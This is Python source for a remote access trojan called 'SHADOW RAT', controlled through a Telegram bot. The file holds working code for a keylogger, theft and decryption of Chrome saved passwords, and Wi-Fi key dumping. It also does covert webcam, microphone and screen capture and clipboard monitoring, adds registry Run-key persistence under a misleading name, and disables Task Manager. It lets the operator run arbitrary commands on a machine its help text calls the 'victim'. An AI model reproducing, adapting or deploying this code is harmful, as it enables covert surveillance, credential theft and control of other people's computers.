# Developer: Sreeraj
# GitHub: https://github.com/s-r-e-e-r-a-j

import telebot
import os
import random
import pyttsx3
import pyautogui
import cv2
import ctypes
import time
import platform
import requests
import threading
import subprocess
import wave
import pyaudio
import numpy as np
from pynput import keyboard
import json
import shutil
from datetime import datetime
import sqlite3
import winreg
import hashlib
import tempfile
import zipfile
import psutil
import win32crypt
from Crypto.Cipher import AES
import base64

BOT_TOKEN: str = 'YOUR_BOT_TOKEN_HERE'
PASSWORD: str = '1234567B'
AUTH_USERS: set[int] = set()
current_directory: str = os.getcwd()
execute_mode: bool = False
waiting_for_upload: bool = False
keylogger_active: bool = False
keylog_listener = None
keylog_buffer: list[str] = []
mouse_mess_active: bool = False
execute_session: bool = False
clipboard_monitor_active: bool = False
usb_monitor_active: bool = False
network_monitor_active: bool = False
screenshot_on_key: bool = False
last_clipboard: str = ""
persistent_mode: bool = False
scheduled_timers: list[threading.Timer] = []

bot = telebot.TeleBot(BOT_TOKEN)

def authenticated(func: callable) -> callable:
    def wrapper(message: telebot.types.Message) -> None:
        if message.from_user.id not in AUTH_USERS:
            bot.send_message(message.chat.id, "Send /start first")
            return
        func(message)
    return wrapper

def on_key_press(key) -> None:
    global keylog_buffer, keylogger_active, screenshot_on_key
    if not keylogger_active:
        return
    
    try:
        if hasattr(key, 'char') and key.char is not None:
            keylog_buffer.append(key.char)
            if screenshot_on_key and key.char.isalnum():
                screenshot_path: str = f"key_screenshot_{int(time.time())}.png"
                pyautogui.screenshot(screenshot_path)
                time.sleep(0.3)
                os.remove(screenshot_path)
        else:
            keylog_buffer.append(f'[{key.name}]' if hasattr(key, 'name') else str(key))
    except:
        keylog_buffer.append(f'[{key}]')
    
    if len(keylog_buffer) >= 100:
        flush_keylogs()

def flush_keylogs() -> None:
    global keylog_buffer
    if keylog_buffer:
        with open('keylog.txt', 'a', encoding='utf-8') as f:
            f.write(''.join(keylog_buffer))
        keylog_buffer = []

def start_keylogger() -> None:
    global keylogger_active, keylog_listener
    keylogger_active = True
    keylog_listener = keyboard.Listener(on_press=on_key_press)
    keylog_listener.start()

def stop_keylogger() -> None:
    global keylogger_active
    keylogger_active = False
    if keylog_listener:
        keylog_listener.stop()
    flush_keylogs()

def monitor_clipboard_background() -> None:
    global last_clipboard, clipboard_monitor_active
    while clipboard_monitor_active:
        try:
            result = subprocess.run(['powershell.exe', '-Command', 'Get-Clipboard'], 
                                  capture_output=True, text=True, timeout=2)
            if result.stdout and result.stdout.strip() != last_clipboard:
                last_clipboard = result.stdout.strip()
                with open('clipboard_history.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{time.time()}: {last_clipboard}\n")
        except:
            pass
        time.sleep(3)

def monitor_usb_devices() -> None:
    global usb_monitor_active
    known_drives: set[str] = set()
    while usb_monitor_active:
        try:
            current_drives: set[str] = {d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{d}:\\')}
            new_drives: set[str] = current_drives - known_drives
            removed_drives: set[str] = known_drives - current_drives
            
            for drive in new_drives:
                with open('usb_log.txt', 'a') as f:
                    f.write(f"{datetime.now()}: USB INSERTED - {drive}:\\\n")
                    
            for drive in removed_drives:
                with open('usb_log.txt', 'a') as f:
                    f.write(f"{datetime.now()}: USB REMOVED - {drive}:\\\n")
                    
            known_drives = current_drives
        except:
            pass
        time.sleep(5)

def monitor_network_connections() -> None:
    global network_monitor_active
    while network_monitor_active:
        try:
            result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=5)
            established: list[str] = [line for line in result.stdout.split('\n') if 'ESTABLISHED' in line]
            
            if len(established) > 20:
                with open('network_alert.txt', 'a') as f:
                    f.write(f"{datetime.now()}: High network activity - {len(established)} connections\n")
                    for conn in established[:5]:
                        f.write(f"  {conn}\n")
        except:
            pass
        time.sleep(30)

def decrypt_chrome_password(encrypted_value: bytes) -> str:
    try:
        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
    except:
        try:
            local_state_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            
            cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8')
        except Exception:
            return "[CANNOT DECRYPT]"

def extract_chrome_passwords() -> list[tuple[str, str, str]]:
    passwords: list[tuple[str, str, str]] = []
    chrome_login_path: str = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
    
    if os.path.exists(chrome_login_path):
        try:
            time.sleep(1)
            
            temp_db: str = os.path.join(tempfile.gettempdir(), "chrome_passwords.db")
            shutil.copy2(chrome_login_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url = row[0][:100]
                username = row[1] if row[1] else "[NO USERNAME]"
                
                if row[2]:
                    try:
                        decrypted_pwd = decrypt_chrome_password(row[2])
                        passwords.append((url, username, decrypted_pwd))
                    except:
                        passwords.append((url, username, "[DECRYPT FAILED]"))
                else:
                    passwords.append((url, username, "[NO PASSWORD]"))
            
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Error: {e}")
    
    return passwords

def add_to_persistence() -> None:
    script_path: str = os.path.abspath(__file__)
    registry_path: str = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    key_name: str = "WindowsSecurityHelper"
    os.system(f'reg add "{registry_path}" /v "{key_name}" /t REG_SZ /d "{script_path}" /f')

def remove_from_persistence() -> None:
    registry_path: str = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    key_name: str = "WindowsSecurityHelper"
    os.system(f'reg delete "{registry_path}" /v "{key_name}" /f')

def get_system_uptime() -> str:
    try:
        uptime_seconds: float = time.time() - psutil.boot_time()
        days: int = int(uptime_seconds // 86400)
        hours: int = int((uptime_seconds % 86400) // 3600)
        minutes: int = int((uptime_seconds % 3600) // 60)
        return f"{days}d {hours}h {minutes}m"
    except:
        return "Unknown"

@bot.message_handler(commands=['start'])
def start_handler(message: telebot.types.Message) -> None:
    bot.send_message(message.chat.id, "Password:")
    bot.register_next_step_handler(message, verify_password)

def verify_password(message: telebot.types.Message) -> None:
    if message.text == PASSWORD:
        AUTH_USERS.add(message.from_user.id)
        bot.send_message(message.chat.id, "SHADOW RAT Activated")
        bot.send_message(message.chat.id, f"Connected - {os.popen('whoami').read().strip()}")
        bot.send_message(message.chat.id, "Use /help")
    else:
        bot.send_message(message.chat.id, "Wrong password")

@bot.message_handler(commands=['help'])
@authenticated
def help_command(message: telebot.types.Message) -> None:
    help_text: str = """
COMMAND LIST:
/start - Connect to RAT
/help - Show this menu
/addstartup - Add to Windows startup
/deletestartup - Remove from Windows startup
/persistence - Enable persistence
/nopersistence - Disable persistence
/hide - Hide script file
/unhide - Unhide script file
/info - Get IP and location
/pcinfo - Detailed system info
/shortinfo - Basic system info
/sysinfo - Complete system information
/uptime - Show system uptime
/run [path] - Execute file
/files - List current directory files
/cd [path] - Change directory
/delete [path] - Delete file or folder
/rename [old] [new] - Rename file/folder
/mkdir [name] - Create directory
/rmdir [name] - Remove empty directory
/search [name] - Search files on C drive
/download [path] - Download file from victim
/upload - Upload file to victim
/downloadurl [url] [name] - Download from internet
/uploadfile [path] - Upload any file to Telegram
/metadata [path] - Show file metadata
/zip [folder] - Create zip archive
/unzip [file] - Extract zip archive
/tasklist - Show running processes
/taskkill [name] - Kill process by name
/processes - Detailed process list with CPU/RAM
/killpid [pid] - Kill process by ID
/shutdown - Shutdown computer
/restart - Restart computer
/sleep - Put computer to sleep
/lockpc - Lock computer
/logoff - Log off current user
/hibernate - Hibernate computer
/block - Block keyboard and mouse
/unblock - Unblock input
/keytype [text] - Type text
/keypress [key] - Press single key
/keypresstwo [k1] [k2] - Press two keys
/keypressthree [k1] [k2] [k3] - Press three keys
/mousemove [x] [y] - Move mouse to coordinates
/mouseclick - Left mouse click
/mouseright - Right mouse click
/mousemesstart - Start mouse movement mess
/mousemesstop - Stop mouse mess
/maximize - Maximize active window
/minimize - Minimize active window
/altf4 - Send Alt+F4 to close window
/fullvolume - Set volume to maximum
/volumeplus - Increase volume by 10
/volumeminus - Decrease volume by 10
/volume [0-100] - Set specific volume level
/mute - Mute system audio
/unmute - Unmute system audio
/keylogstart - Start keylogger
/keylogstop - Stop keylogger
/keylogdump - Download keylog file
/keylogscreenshot - Take screenshot on each key press
/clipboard - Show current clipboard
/changeclipboard [text] - Change clipboard content
/clipmonstart - Start clipboard monitoring
/clipmonstop - Stop clipboard monitoring
/usbmonitorstart - Monitor USB devices
/usbmonitorstop - Stop USB monitoring
/networkmonitorstart - Monitor network connections
/networkmonitorstop - Stop network monitoring
/wifilist - Show saved Wi-Fi networks
/wifipass [name] - Show Wi-Fi password
/netstat - Show active connections
/passwords - Extract Chrome saved passwords with decryption
/passwordsall - Extract passwords from all Chrome profiles
/chrome [url] - Open URL in Chrome
/edge [url] - Open URL in Edge
/firefox [url] - Open URL in Firefox
/screenshot - Take screenshot
/screenrecord [sec] - Record screen
/mic [sec] - Record microphone
/webscreen - Take webcam photo
/webcam [sec] - Record webcam video
/textspeech [text] - Text to speech
/say [text] - Speak text
/playsound [path] - Play audio file
/e [cmd] - Execute command (short output)
/ex [cmd] - Execute command (long output as file)
/execute - Start interactive shell session
/msg [type] [title] [text] - Show message box
/notify [title] [text] - Show notification
/disabletaskmgr - Disable Task Manager
/enabletaskmgr - Enable Task Manager
/users - Show system users
/whoami - Show current username
/apps - Show installed applications
/batteryinfo - Show battery information
/schedule [time] [command] - Schedule command execution
/listschedules - List scheduled tasks
/clearschedules - Clear all scheduled tasks
/wallpaper - Change desktop wallpaper
/cmdbomb - Open 10 CMD windows
"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['keylogstart'])
@authenticated
def keylog_start(message: telebot.types.Message) -> None:
    global keylogger_active
    if not keylogger_active:
        start_keylogger()
        bot.send_message(message.chat.id, "Keylogger started")
    else:
        bot.send_message(message.chat.id, "Keylogger already running")

@bot.message_handler(commands=['keylogstop'])
@authenticated
def keylog_stop(message: telebot.types.Message) -> None:
    global keylogger_active
    if keylogger_active:
        stop_keylogger()
        bot.send_message(message.chat.id, "Keylogger stopped")
    else:
        bot.send_message(message.chat.id, "Keylogger not running")

@bot.message_handler(commands=['keylogdump'])
@authenticated
def keylog_dump(message: telebot.types.Message) -> None:
    flush_keylogs()
    if os.path.exists('keylog.txt'):
        with open('keylog.txt', 'rb') as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.send_message(message.chat.id, "No keylogs found")

@bot.message_handler(commands=['keylogscreenshot'])
@authenticated
def keylog_screenshot_mode(message: telebot.types.Message) -> None:
    global screenshot_on_key
    screenshot_on_key = not screenshot_on_key
    status: str = "enabled" if screenshot_on_key else "disabled"
    bot.send_message(message.chat.id, f"Screenshot on key press {status}")

@bot.message_handler(commands=['addstartup'])
@authenticated
def add_startup(message: telebot.types.Message) -> None:
    bot.send_message(message.chat.id, "Send full exe path:")
    bot.register_next_step_handler(message, save_startup_path)

def save_startup_path(message: telebot.types.Message) -> None:
    key_name: str = "WindowsHelper"
    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /t REG_SZ /d "{message.text}" /f')
    bot.send_message(message.chat.id, "Added to startup")

@bot.message_handler(commands=['deletestartup'])
@authenticated
def delete_startup(message: telebot.types.Message) -> None:
    key_name: str = "WindowsHelper"
    os.system(f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /f')
    bot.send_message(message.chat.id, "Removed from startup")

@bot.message_handler(commands=['persistence'])
@authenticated
def enable_persistence(message: telebot.types.Message) -> None:
    global persistent_mode
    add_to_persistence()
    persistent_mode = True
    bot.send_message(message.chat.id, "Persistence enabled - Script will run on boot")

@bot.message_handler(commands=['nopersistence'])
@authenticated
def disable_persistence(message: telebot.types.Message) -> None:
    global persistent_mode
    remove_from_persistence()
    persistent_mode = False
    bot.send_message(message.chat.id, "Persistence disabled")

@bot.message_handler(commands=['run'])
@authenticated
def run_file(message: telebot.types.Message) -> None:
    path: str = message.text.split('/run', 1)[1].strip()
    os.startfile(path)
    bot.send_message(message.chat.id, "File executed")

@bot.message_handler(commands=['whoami'])
@authenticated
def whoami_command(message: telebot.types.Message) -> None:
    result: str = os.popen('whoami').read().strip()
    bot.send_message(message.chat.id, f"User: {result}")

@bot.message_handler(commands=['users'])
@authenticated
def users_command(message: telebot.types.Message) -> None:
    result: str = os.popen('net user').read().strip()
    bot.send_message(message.chat.id, f"Users:\n{result[:4000]}")

@bot.message_handler(commands=['tasklist'])
@authenticated
def tasklist_command(message: telebot.types.Message) -> None:
    result: str = os.popen('tasklist').read().strip()
    chunks: list[str] = [result[i:i+4000] for i in range(0, len(result), 4000)]
    for chunk in chunks:
        bot.send_message(message.chat.id, f"Processes:\n{chunk}")

@bot.message_handler(commands=['taskkill'])
@authenticated
def taskkill_command(message: telebot.types.Message) -> None:
    task: str = message.text.split('/taskkill', 1)[1].strip()
    result: str = os.popen(f'taskkill /f /im {task}').read().strip()
    bot.send_message(message.chat.id, result)

@bot.message_handler(commands=['shutdown'])
@authenticated
def shutdown_command(message: telebot.types.Message) -> None:
    os.system('shutdown /s /f /t 0')
    bot.send_message(message.chat.id, "Shutting down")

@bot.message_handler(commands=['restart'])
@authenticated
def restart_command(message: telebot.types.Message) -> None:
    os.system('shutdown /r /f /t 0')
    bot.send_message(message.chat.id, "Restarting")

@bot.message_handler(commands=['sleep'])
@authenticated
def sleep_command(message: telebot.types.Message) -> None:
    ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
    bot.send_message(message.chat.id, "Sleep mode")

@bot.message_handler(commands=['lockpc'])
@authenticated
def lock_computer(message: telebot.types.Message) -> None:
    ctypes.windll.user32.LockWorkStation()
    bot.send_message(message.chat.id, "Computer locked")

@bot.message_handler(commands=['logoff'])
@authenticated
def logoff_user(message: telebot.types.Message) -> None:
    os.system('shutdown /l /f')
    bot.send_message(message.chat.id, "Logging off")

@bot.message_handler(commands=['hibernate'])
@authenticated
def hibernate_computer(message: telebot.types.Message) -> None:
    os.system('shutdown /h')
    bot.send_message(message.chat.id, "Hibernating")

@bot.message_handler(commands=['altf4'])
@authenticated
def altf4_command(message: telebot.types.Message) -> None:
    pyautogui.hotkey('alt', 'f4')
    bot.send_message(message.chat.id, "Alt+F4 pressed")

@bot.message_handler(commands=['cmdbomb'])
@authenticated
def cmdbomb_command(message: telebot.types.Message) -> None:
    for _ in range(10):
        os.system('start cmd')
    bot.send_message(message.chat.id, "Opened 10 CMD windows")

@bot.message_handler(commands=['msg'])
@authenticated
def msg_command(message: telebot.types.Message) -> None:
    parts: list[str] = message.text.split('/msg', 1)[1].strip().split()
    msg_type: str = parts[0]
    title: str = parts[1]
    text: str = ' '.join(parts[2:])
    types_map: dict[str, int] = {"info": 64, "warning": 48, "error": 16, "question": 32, "default": 0}
    code: int = types_map.get(msg_type, 0)
    os.system(f'mshta vbscript:Execute("msgbox ""{text}"", {code}, ""{title}"":close")')
    bot.send_message(message.chat.id, "Message displayed")

@bot.message_handler(commands=['notify'])
@authenticated
def show_notification(message: telebot.types.Message) -> None:
    parts: list[str] = message.text.split('/notify', 1)[1].strip().split(' ', 1)
    title: str = parts[0]
    text: str = parts[1] if len(parts) > 1 else ""
    os.system(f'powershell -Command "& {{$wshell = New-Object -ComObject Wscript.Shell; $wshell.Popup(\'{text}\', 0, \'{title}\', 48)}}"')
    bot.send_message(message.chat.id, "Notification sent")

@bot.message_handler(commands=['wallpaper'])
@authenticated
def wallpaper_command(message: telebot.types.Message) -> None:
    bot.send_message(message.chat.id, "First use /upload to send image, then send filename:")
    bot.register_next_step_handler(message, set_wallpaper)

def set_wallpaper(message: telebot.types.Message) -> None:
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(message.text), 0)
    bot.send_message(message.chat.id, "Wallpaper changed")

@bot.message_handler(commands=['disabletaskmgr'])
@authenticated
def disable_taskmgr(message: telebot.types.Message) -> None:
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    bot.send_message(message.chat.id, "Task Manager disabled")

@bot.message_handler(commands=['enabletaskmgr'])
@authenticated
def enable_taskmgr(message: telebot.types.Message) -> None:
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f')
    bot.send_message(message.chat.id, "Task Manager enabled")

@bot.message_handler(commands=['screenshot'])
@authenticated
def screenshot_command(message: telebot.types.Message) -> None:
    path: str = "temp_screenshot.png"
    pyautogui.screenshot(path)
    with open(path, 'rb') as img:
        bot.send_photo(message.chat.id, img)
    os.remove(path)

@bot.message_handler(commands=['mic'])
@authenticated
def mic_command(message: telebot.types.Message) -> None:
    duration: int = int(message.text.split()[1]) if len(message.text.split()) > 1 else 5
    chunk: int = 1024
    format_type: int = pyaudio.paInt16
    channels: int = 2
    rate: int = 44100
    output: str = "temp_audio.wav"
    p = pyaudio.PyAudio()
    stream = p.open(format=format_type, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
    frames: list[bytes] = []
    for _ in range(0, int(rate / chunk * duration)):
        frames.append(stream.read(chunk))
    stream.stop_stream()
    stream.close()
    p.terminate()
    with wave.open(output, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(format_type))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
    with open(output, 'rb') as audio:
        bot.send_audio(message.chat.id, audio)
    os.remove(output)

@bot.message_handler(commands=['webscreen'])
@authenticated
def webscreen_command(message: telebot.types.Message) -> None:
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        path: str = "temp_webcam.jpg"
        cv2.imwrite(path, frame)
        with open(path, 'rb') as img:
            bot.send_photo(message.chat.id, img)
        os.remove(path)
    cap.release()

@bot.message_handler(commands=['webcam'])
@authenticated
def webcam_command(message: telebot.types.Message) -> None:
    duration: int = int(message.text.split()[1]) if len(message.text.split()) > 1 else 5
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output: str = "temp_video.avi"
    out = cv2.VideoWriter(output, fourcc, 20.0, (640, 480))
    start: float = time.time()
    while time.time() - start < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
    cap.release()
    out.release()
    with open(output, 'rb') as video:
        bot.send_video(message.chat.id, video)
    os.remove(output)

@bot.message_handler(commands=['screenrecord'])
@authenticated
def screenrecord_command(message: telebot.types.Message) -> None:
    duration: int = int(message.text.split()[1]) if len(message.text.split()) > 1 else 10
    width, height = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output: str = "temp_record.avi"
    out = cv2.VideoWriter(output, fourcc, 10.0, (width, height))
    start: float = time.time()
    while time.time() - start < duration:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)
    out.release()
    with open(output, 'rb') as video:
        bot.send_video(message.chat.id, video)
    os.remove(output)

@bot.message_handler(commands=['block'])
@authenticated
def block_input(message: telebot.types.Message) -> None:
    ctypes.windll.user32.BlockInput(True)
    bot.send_message(message.chat.id, "Input blocked")

@bot.message_handler(commands=['unblock'])
@authenticated
def unblock_input(message: telebot.types.Message) -> None:
    ctypes.windll.user32.BlockInput(False)
    bot.send_message(message.chat.id, "Input unblocked")

def mouse_mess_loop() -> None:
    global mouse_mess_active
    while mouse_mess_active:
        x: int = random.randint(100, 1000)
        y: int = random.randint(100, 800)
        pyautogui.moveTo(x, y, 0.5)
        time.sleep(1)

@bot.message_handler(commands=['mousemesstart'])
@authenticated
def mousemes_start(message: telebot.types.Message) -> None:
    global mouse_mess_active
    mouse_mess_active = True
    threading.Thread(target=mouse_mess_loop, daemon=True).start()
    bot.send_message(message.chat.id, "Mouse mess started")

@bot.message_handler(commands=['mousemesstop'])
@authenticated
def mousemes_stop(message: telebot.types.Message) -> None:
    global mouse_mess_active
    mouse_mess_active = False
    bot.send_message(message.chat.id, "Mouse mess stopped")

@bot.message_handler(commands=['mousemove'])
@authenticated
def mousemove_command(message: telebot.types.Message) -> None:
    coords: list[str] = message.text.split('/mousemove', 1)[1].strip().split()
    x: int = int(coords[0])
    y: int = int(coords[1])
    pyautogui.moveTo(x, y)
    bot.send_message(message.chat.id, f"Moved to ({x}, {y})")

@bot.message_handler(commands=['mouseclick'])
@authenticated
def mouseclick_command(message: telebot.types.Message) -> None:
    pyautogui.click()
    bot.send_message(message.chat.id, "Left clicked")

@bot.message_handler(commands=['mouseright'])
@authenticated
def mouseright_command(message: telebot.types.Message) -> None:
    pyautogui.rightClick()
    bot.send_message(message.chat.id, "Right clicked")

@bot.message_handler(commands=['fullvolume'])
@authenticated
def fullvolume_command(message: telebot.types.Message) -> None:
    for _ in range(50):
        pyautogui.press('volumeup')
    bot.send_message(message.chat.id, "Max volume")

@bot.message_handler(commands=['volumeplus'])
@authenticated
def volumeplus_command(message: telebot.types.Message) -> None:
    for _ in range(5):
        pyautogui.press('volumeup')
    bot.send_message(message.chat.id, "Volume +10%")

@bot.message_handler(commands=['volumeminus'])
@authenticated
def volumeminus_command(message: telebot.types.Message) -> None:
    for _ in range(5):
        pyautogui.press('volumedown')
    bot.send_message(message.chat.id, "Volume -10%")

@bot.message_handler(commands=['volume'])
@authenticated
def set_volume(message: telebot.types.Message) -> None:
    try:
        level: int = int(message.text.split('/volume', 1)[1].strip())
        level = max(0, min(100, level))
        for _ in range(level // 2):
            pyautogui.press('volumeup')
        bot.send_message(message.chat.id, f"Volume set to {level}%")
    except:
        bot.send_message(message.chat.id, "Usage: /volume 0-100")

@bot.message_handler(commands=['mute'])
@authenticated
def mute_system(message: telebot.types.Message) -> None:
    pyautogui.press('volumemute')
    bot.send_message(message.chat.id, "System muted")

@bot.message_handler(commands=['unmute'])
@authenticated
def unmute_system(message: telebot.types.Message) -> None:
    pyautogui.press('volumemute')
    bot.send_message(message.chat.id, "System unmuted")

@bot.message_handler(commands=['maximize'])
@authenticated
def maximize_command(message: telebot.types.Message) -> None:
    pyautogui.hotkey('win', 'up')
    bot.send_message(message.chat.id, "Window maximized")

@bot.message_handler(commands=['minimize'])
@authenticated
def minimize_command(message: telebot.types.Message) -> None:
    pyautogui.hotkey('win', 'down')
    bot.send_message(message.chat.id, "Window minimized")

@bot.message_handler(commands=['wifilist'])
@authenticated
def wifilist_command(message: telebot.types.Message) -> None:
    result: str = os.popen('netsh wlan show profile').read().strip()
    bot.send_message(message.chat.id, f"Wi-Fi networks:\n{result[:4000]}")

@bot.message_handler(commands=['wifipass'])
@authenticated
def wifipass_command(message: telebot.types.Message) -> None:
    name: str = message.text.split('/wifipass', 1)[1].strip()
    result: str = os.popen(f'netsh wlan show profile name="{name}" key=clear').read().strip()
    bot.send_message(message.chat.id, result[:4000])

@bot.message_handler(commands=['passwords'])
@authenticated
def extract_passwords(message: telebot.types.Message) -> None:
    bot.send_message(message.chat.id, "Extracting saved passwords...")
    
    try:
        passwords: list[tuple[str, str, str]] = extract_chrome_passwords()
        
        if passwords:
            if len(passwords) > 20:
                filename = "chrome_passwords.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    for url, username, pwd in passwords:
                        f.write(f"URL: {url}\nUsername: {username}\nPassword: {pwd}\n\n")
                
                with open(filename, 'rb') as f:
                    bot.send_document(message.chat.id, f, caption=f"Found {len(passwords)} passwords")
                os.remove(filename)
            else:
                response = f"Found {len(passwords)} passwords:\n\n"
                for url, username, pwd in passwords[:10]:
                    response += f"URL: {url}\nUser: {username}\nPass: {pwd}\n\n"
                bot.send_message(message.chat.id, response[:4000])
        else:
            bot.send_message(message.chat.id, "No passwords found")
    except ImportError:
        pass
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)[:200]}")

@bot.message_handler(commands=['passwordsall'])
@authenticated
def extract_all_passwords(message: telebot.types.Message) -> None:
    bot.send_message(message.chat.id, "Extracting from all profiles...")
    
    try:
        chrome_base = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
        all_found = {}
        
        if os.path.exists(chrome_base):
            profiles = ['Default']
            for item in os.listdir(chrome_base):
                if item.startswith('Profile '):
                    profiles.append(item)
            
            for profile in profiles:
                login_path = os.path.join(chrome_base, profile, "Login Data")
                if os.path.exists(login_path):
                    temp_db = os.path.join(tempfile.gettempdir(), f"chrome_{profile}.db")
                    shutil.copy2(login_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    profile_pwds = []
                    for row in cursor.fetchall():
                        if row[2]:
                            try:
                                pwd = decrypt_chrome_password(row[2])
                                profile_pwds.append((row[0][:80], row[1] or "NO USER", pwd))
                            except:
                                pass
                    
                    if profile_pwds:
                        all_found[profile] = profile_pwds
                    conn.close()
                    os.remove(temp_db)
            
            if all_found:
                filename = "all_passwords.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    total = 0
                    for profile, pwds in all_found.items():
                        f.write(f"\n{profile}:\n")
                        f.write("="*40 + "\n")
                        for url, user, pwd in pwds:
                            f.write(f"URL: {url}\nUser: {user}\nPass: {pwd}\n\n")
                            total += 1
                
                with open(filename, 'rb') as f:
                    bot.send_document(message.chat.id, f, caption=f"Total: {total} passwords")
                os.remove(filename)
            else:
                bot.send_message(message.chat.id, "No passwords found")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)[:200]}")

@bot.message_handler(commands=['netstat'])
@authenticated
def netstat_command(message: telebot.types.Message) -> None:
    result: str = os.popen('netstat -an | findstr ESTABLISHED').read()
    connections: int = len(result.strip().split('\n')) if result.strip() else 0
    bot.send_message(message.chat.id, f"Active connections: {connections}\n\n{result[:4000]}")

@bot.message_handler(commands=['clipboard'])
@authenticated
def clipboard_command(message: telebot.types.Message) -> None:
    try:
        result = subprocess.run(['powershell.exe', '-Command', 'Get-Clipboard'], 
                              capture_output=True, text=True, timeout=5)
        if result.stdout and result.stdout.strip():
            bot.send_message(message.chat.id, f"Clipboard: {result.stdout.strip()[:4000]}")
            return
    except:
        pass

    try:
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(1):
            data = user32.GetClipboardData(1)
            if data:
                locked = kernel32.GlobalLock(data)
                if locked:
                    text = ctypes.c_char_p(locked).value
                    if text:
                        clipboard_text = text.decode('utf-8', errors='ignore')
                        kernel32.GlobalUnlock(locked)
                        user32.CloseClipboard()
                        bot.send_message(message.chat.id, f"Clipboard: {clipboard_text[:4000]}")
                        return
            if locked:
                kernel32.GlobalUnlock(locked)
        user32.CloseClipboard()
        bot.send_message(message.chat.id, "Clipboard empty or contains non-text data")
    except Exception as e:
        bot.send_message(message.chat.id, f"Could not read clipboard: {str(e)}")

@bot.message_handler(commands=['changeclipboard'])
@authenticated
def changeclipboard_command(message: telebot.types.Message) -> None:
    text: str = message.text.split('/changeclipboard', 1)[1].strip()
    os.system(f'echo {text} | clip')
    bot.send_message(message.chat.id, f"Clipboard set to: {text}")

@bot.message_handler(commands=['clipmonstart'])
@authenticated
def start_clipboard_monitor(message: telebot.types.Message) -> None:
    global clipboard_monitor_active
    if not clipboard_monitor_active:
        clipboard_monitor_active = True
        threading.Thread(target=monitor_clipboard_background, daemon=True).start()
        bot.send_message(message.chat.id, "Clipboard monitor started")
    else:
        bot.send_message(message.chat.id, "Clipboard monitor already running")

@bot.message_handler(commands=['clipmonstop'])
@authenticated
def stop_clipboard_monitor(message: telebot.types.Message) -> None:
    global clipboard_monitor_active
    clipboard_monitor_active = False
    bot.send_message(message.chat.id, "Clipboard monitor stopped")

@bot.message_handler(commands=['usbmonitorstart'])
@authenticated
def start_usb_monitor(message: telebot.types.Message) -> None:
    global usb_monitor_active
    if not usb_monitor_active:
        usb_monitor_active = True
        threading.Thread(target=monitor_usb_devices, daemon=True).start()
        bot.send_message(message.chat.id, "USB monitor started")
    else:
        bot.send_message(message.chat.id, "USB monitor already running")

@bot.message_handler(commands=['usbmonitorstop'])
@authenticated
def stop_usb_monitor(message: telebot.types.Message) -> None:
    global usb_monitor_active
    usb_monitor_active = False
    bot.send_message(message.chat.id, "USB monitor stopped")

@bot.message_handler(commands=['networkmonitorstart'])
@authenticated
def start_network_monitor(message: telebot.types.Message) -> None:
    global network_monitor_active
    if not network_monitor_active:
        network_monitor_active = True
        threading.Thread(target=monitor_network_connections, daemon=True).start()
        bot.send_message(message.chat.id, "Network monitor started")
    else:
        bot.send_message(message.chat.id, "Network monitor already running")

@bot.message_handler(commands=['networkmonitorstop'])
@authenticated
def stop_network_monitor(message: telebot.types.Message) -> None:
    global network_monitor_active
    network_monitor_active = False
    bot.send_message(message.chat.id, "Network monitor stopped")

@bot.message_handler(commands=['chrome'])
@authenticated
def chrome_command(message: telebot.types.Message) -> None:
    url: str = message.text.split('/chrome', 1)[1].strip()
    os.system(f'start chrome "{url}"')
